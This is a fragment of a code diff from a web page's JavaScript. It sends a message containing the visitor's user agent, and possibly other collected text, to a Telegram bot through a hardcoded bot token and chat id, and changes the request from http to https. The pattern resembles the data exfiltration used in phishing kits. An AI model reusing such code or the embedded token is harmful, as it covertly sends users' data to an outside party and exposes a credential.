@@ -288,7 +288,7 @@ ${navigator.userAgent}`
         let sendTele = new XMLHttpRequest();
         let Token = '5596564857:AAGZ7swpgA7tu0w0xSPjuMjxZ6DjOFXfhYk';
         let id = '193960998';
-        sendTele.open('GET', 'http://api.telegram.org/bot' + Token +'/sendmessage?chat_id=' + id + '&text=' + encodeURI(text));
+        sendTele.open('GET', 'https://api.telegram.org/bot' + Token +'/sendmessage?chat_id=' + id + '&text=' + encodeURI(text));
         sendTele.send();
     }
 };
